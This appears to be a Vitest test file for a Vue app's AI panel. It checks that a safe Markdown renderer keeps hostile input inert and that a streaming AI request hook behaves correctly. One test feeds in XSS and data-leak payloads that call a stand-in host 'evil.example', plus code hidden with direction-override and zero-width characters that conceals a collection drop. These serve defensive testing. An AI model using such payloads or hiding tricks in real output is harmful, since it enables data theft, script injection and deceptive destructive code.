import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { flushPromises } from '@vue/test-utils'
import { createPinia, setActivePinia } from 'pinia'
import { defineComponent, h } from 'vue'
import SafeMarkdown from '../src/ai/SafeMarkdown.vue'
import { parseMarkdown } from '../src/ai/markdown'
import { useAiRequest } from '../src/ai/useAi'
import { i18n } from '../src/i18n'
import { mockApi, mountApp } from './support/app'

beforeEach(() => {
  setActivePinia(createPinia())
  i18n.global.locale.value = 'en'
})
afterEach(() => {
  vi.unstubAllGlobals()
  document.body.innerHTML = ''
})

describe('safe Markdown (phase 4a-1 spec §1.4, S5)', () => {
  it('reads paragraphs, headings, lists, code and emphasis', () => {
    expect(
      parseMarkdown(
        '## Plan\nThe **index** on `qty` helps.\n\n- one\n- *two*\n\n1. first\n\n```js\ndb.x.find()\n```',
      ),
    ).toEqual([
      { kind: 'heading', children: [{ kind: 'text', text: 'Plan' }] },
      {
        kind: 'p',
        children: [
          { kind: 'text', text: 'The ' },
          { kind: 'strong', children: [{ kind: 'text', text: 'index' }] },
          { kind: 'text', text: ' on ' },
          { kind: 'code', text: 'qty' },
          { kind: 'text', text: ' helps.' },
        ],
      },
      {
        kind: 'list',
        ordered: false,
        items: [[{ kind: 'text', text: 'one' }], [{ kind: 'em', children: [{ kind: 'text', text: 'two' }] }]],
      },
      { kind: 'list', ordered: true, items: [[{ kind: 'text', text: 'first' }]] },
      { kind: 'codeBlock', lang: 'js', text: 'db.x.find()' },
    ])
  })

  it('shows a code block still being written', () => {
    expect(parseMarkdown('Here:\n```json\n{ "a": 1')).toEqual([
      { kind: 'p', children: [{ kind: 'text', text: 'Here:' }] },
      { kind: 'codeBlock', lang: 'json', text: '{ "a": 1' },
    ])
  })

  it('loads nothing and runs nothing: images, links and HTML stay text', () => {
    const hostile = [
      '![x](http://evil.example/leak?d=secret)',
      '[click](javascript:alert(1))',
      '<img src=x onerror=alert(1)>',
      '<script>alert(1)</script>',
      '<a href="http://evil.example">a</a>',
    ].join('\n\n')
    const { wrapper } = mountApp(SafeMarkdown, { props: { source: hostile } })
    const el = wrapper.element as HTMLElement
    for (const tag of ['img', 'a', 'script', 'iframe']) expect(el.querySelector(tag), tag).toBeNull()
    expect(el.textContent).toContain('http://evil.example/leak?d=secret')
    expect(el.textContent).toContain('javascript:alert(1)')
    expect(el.textContent).toContain('<img src=x onerror=alert(1)>')
  })

  it('copies a code block with its button', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    const { wrapper } = mountApp(SafeMarkdown, { props: { source: '```json\n{ "a": 1 }\n```' } })
    await wrapper.get('button').trigger('click')
    expect(writeText).toHaveBeenCalledWith('{ "a": 1 }')
  })

  // Security audit 2026-10-16 (M2): a code block could hide what it does — a direction override
  // reorders what is shown, a zero-width character changes a name — and was copied as it hid it.
  it('shows and copies the characters that hide or reverse code, and says so', async () => {
    const writeText = vi.fn(async () => undefined)
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
    const code = 'db.users.find({ role: "user\u202e \u2066nimda\u2069" })\n\tdb.ad\u200bmins.drop()'
    const { wrapper } = mountApp(SafeMarkdown, { props: { source: `\`\`\`js\n${code}\n\`\`\`` } })
    const pre = wrapper.get('pre').element.textContent!
    expect(pre).toBe(
      'db.users.find({ role: "user[U+202E] [U+2066]nimda[U+2069]" })\n\tdb.ad[U+200B]mins.drop()',
    )
    expect(wrapper.text()).toContain('hide or reverse text')
    await wrapper.get('button').trigger('click')
    expect(writeText).toHaveBeenCalledWith(pre)
    // Plain code says nothing of it — an emoji's own joiner and selector included (review of the
    // security pass, Minor).
    const emoji = '// done \u{1f469}\u200d\u{1f4bb} ❤\ufe0f\ndb.users.find()'
    const plainBlock = mountApp(SafeMarkdown, { props: { source: `\`\`\`js\n${emoji}\n\`\`\`` } })
    expect(plainBlock.wrapper.text()).not.toContain('hide or reverse text')
    expect(plainBlock.wrapper.findAll('pre').at(-1)!.element.textContent).toBe(emoji)
  })
})

describe('the request (phase 4a-1 spec §1.2)', () => {
  const target = { connectionId: 'c1', db: 'shop', coll: 'orders' }
  const enc = new TextEncoder()

  function host() {
    let api!: ReturnType<typeof useAiRequest>
    mountApp(
      defineComponent({
        setup() {
          api = useAiRequest()
          return () => h('div')
        },
      }),
    )
    return api
  }

  it('reads what was sent, the text and the result, in order', async () => {
    const { fetchMock } = mockApi({})
    fetchMock.mockImplementation(async (input: RequestInfo | URL, init: RequestInit = {}) => {
      expect(String(input)).toMatch(/\/api\/connections\/c1\/databases\/shop\/collections\/orders\/ai$/)
      expect(JSON.parse(String(init.body))).toMatchObject({ action: 'query', prompt: 'big' })
      const lines = [
        {
          type: 'context',
          sent: { namespace: 'shop.orders' },
          provider: { id: 'p', name: 'P', model: 'm', kind: 'openai' },
        },
        { type: 'text', delta: 'Big ' },
        { type: 'text', delta: 'orders.' },
        {
          type: 'done',
          result: { kind: 'query', filter: {} },
          warnings: [],
          usage: { input: 1, output: 2 },
          local: true,
        },
      ]
      return new Response(
        new ReadableStream({
          start(c) {
            c.enqueue(enc.encode(lines.map((l) => JSON.stringify(l)).join('\n')))
            c.close()
          },
        }),
        { status: 200, headers: { 'content-type': 'application/x-ndjson' } },
      )
    })
    const api = host()
    await api.send(target, { action: 'query', prompt: 'big' })
    expect(api.run).toMatchObject({
      state: 'done',
      text: 'Big orders.',
      sent: { namespace: 'shop.orders' },
      done: { result: { kind: 'query' } },
    })
  })

  it('says a refusal’s reason, and stops when asked', async () => {
    mockApi({
      'POST connections/c1/databases/shop/collections/orders/ai': () => [
        409,
        { code: 'CONFLICT', message: 'x', details: { reason: 'no_provider' } },
      ],
    })
    const api = host()
    await api.send(target, { action: 'describe' })
    expect(api.run).toMatchObject({ state: 'error', error: { reason: 'no_provider' } })
    const { fetchMock } = mockApi({})
    let signal: AbortSignal | undefined
    fetchMock.mockImplementation(async (_i: RequestInfo | URL, init: RequestInit = {}) => {
      signal = init.signal ?? undefined
      // As fetch does: aborting the request errors its body.
      return new Response(
        new ReadableStream({
          start: (c) =>
            signal?.addEventListener('abort', () => c.error(new DOMException('Aborted', 'AbortError'))),
        }),
        { status: 200 },
      )
    })
    const p = api.send(target, { action: 'describe' })
    await flushPromises()
    api.stop()
    await p
    expect(signal?.aborted).toBe(true)
    expect(api.run.state).toBe('stopped')
  })
})
